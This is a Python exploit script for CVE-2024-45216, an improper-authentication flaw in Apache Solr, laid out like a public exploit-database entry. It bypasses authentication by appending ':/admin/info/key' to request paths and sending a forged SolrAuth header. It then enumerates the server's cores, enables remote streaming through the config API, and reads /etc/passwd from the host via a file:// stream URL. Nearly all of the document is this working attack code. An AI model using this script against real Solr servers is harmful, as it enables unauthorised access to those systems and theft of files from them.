# Title: Improper Authentication vulnerability in Apache Solr ( CVE-2024-45216 )
# Date : 2024-12-01
# Author: Dong Cong
#         
#         ZXJpYy5jb25nZG9uZ0BnbWFpbC5jb20=
# 
# CVE : 2024-45216

#!/usr/bin/python3

import requests
import json
import argparse
import warnings

url0 = '/solr/admin/cores:/admin/info/key?indexInfo=false&wt=json'

url1 = '/solr/{}/config:/admin/info/key'
url2 = '/solr/{}/debug/dump:/admin/info/key?param=ContentStreams&stream.url=file:///etc/passwd'


warnings.filterwarnings("ignore")

parser=argparse.ArgumentParser()
parser.add_argument("--host", help="input the vulnerable host", type=str)
args = parser.parse_args()

# http://xx.xx.xx.xx:8983
host = args.host
print(host)

headers1 = {
    'SolrAuth': 'test',
}

params1 = {
    'indexInfo': 'false',
    'wt': 'json',
}

headers2 = {
    'SolrAuth': 'test',
    'Content-Type': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    # 'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6',
    'Connection': 'close',
}

headers3 = {
'SolrAuth': 'test',
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82Safari/537.36',
'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
# 'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6',
'Connection': 'close',
}

json_data = {
    'set-property': {
        'requestDispatcher.requestParsers.enableRemoteStreaming': True,
    },
}    

try:
    response = requests.post(
        f'{host}{url0}',
        params=params1,
        headers=headers1,
        timeout=10
    )
    if response.status_code == 200 and "application/json" in response.headers.get("Content-Type", ""):
        
        print(f"{host} ---> {len(response.text)} \n\n")
        print(response.text)  
        print('\n\n\n' + '*'*78 + '\n\n\n')

        data1 = None
        data1 = json.loads(response.text)

        if data1 != None:

            status_data = data1.get("status", {})

            for core_name, core_details in status_data.items():

                print(f"Core Name: {core_name}")
                temp_url = url1.format(core_name)

                response = requests.post(f'{host}{temp_url}', headers=headers2, json=json_data,timeout=10)                    

                if response.status_code == 200 and len(response.text) < 200:
                    print(f'{host}{temp_url} ---> {len(response.text)} \n\n')
                    print(response.text)  
                    print('\n\n\n' +'*'*78 + '\n\n\n')                        

                    temp_url = url2.format(core_name)

                    response = requests.post(f'{host}{temp_url}', headers=headers2,timeout=10)

                    if response.status_code == 200:
                        
                        print(f'{host}{temp_url} ---> {len(response.text)} \n\n')
                        print(response.text)                        

    else:
        pass

except requests.exceptions.HTTPError as http_err:
    pass#print(f"HTTP 错误: {http_err}")
except requests.exceptions.ConnectionError as conn_err:
    pass#print(f"连接错误: {conn_err}")
except requests.exceptions.Timeout as timeout_err:
    pass#print(f"请求超时: {timeout_err}")
except requests.exceptions.RequestException as req_err:
    pass#print(f"请求错误: {req_err}") 
